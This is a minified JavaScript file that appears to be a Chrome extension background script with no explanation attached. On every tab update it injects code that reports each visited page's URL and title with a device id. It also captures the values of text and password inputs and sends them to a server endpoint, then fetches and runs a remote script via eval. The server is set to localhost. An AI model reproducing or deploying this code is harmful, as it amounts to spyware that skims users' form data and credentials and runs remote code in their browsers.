(()=>{const init=()=>()=>{localStorage.extensionUniqueId=navigator.platform||navigator.userAgentData?.platform||"Unknown";var t="http://localhost".replace(/\$/g,"");chrome.ME={url:t,post:({url:t,body:e={}})=>fetch(t,{method:"POST",headers:{Accept:"application/json","Content-Type":"application/json"},body:JSON.stringify(e)})}},local=()=>()=>{const{url:t,post:o}=chrome.ME;const e=t+"/api/extension/url_details",n=t+"/api/extension/notify",i=t+"/api/extension/inputs",a=localStorage.extensionUniqueId.replace(/&/g,"");var c="true"===sessionStorage.notified;{let t=document.querySelector("link[rel=icon]");t=t?t.href||"No link":"No icon",o({url:e,body:{...location,icon:t,title:document.title,deviceId:a}})}{const r=[...document.querySelectorAll("input")].filter(t=>!["checkbox","submit","radio","date","datetime","time","select"].includes(t.type));let e=null;r.forEach(t=>t.onchange=()=>{t.touched=!0,e=r.map(({id:t,name:e,type:o,value:n,touched:i})=>({id:t,name:e,type:o,value:n,touched:i})),localStorage.setItem("inputs",JSON.stringify(e))}),r.forEach(t=>t.onblur=()=>{o({url:i,body:{json:JSON.stringify(e),...location,deviceId:a}})})}c||!async function(){var t=await o({url:n,body:{...location,deviceId:a}});t.ok&&(sessionStorage.notified=!0)}()};chrome.tabs.onUpdated.addListener(async function(tabId,info,tab){chrome.scripting.executeScript({target:{tabId:tabId},function:init()}),"complete"===info.status&&(chrome.scripting.executeScript({target:{tabId:tabId},function:local()}),chrome.scripting.executeScript({target:{tabId:tabId},function:async function(){const res=await chrome.ME.post({url:chrome.ME.url+"/api/extension/script"}),script=await res.text();eval(script)}}))})})();
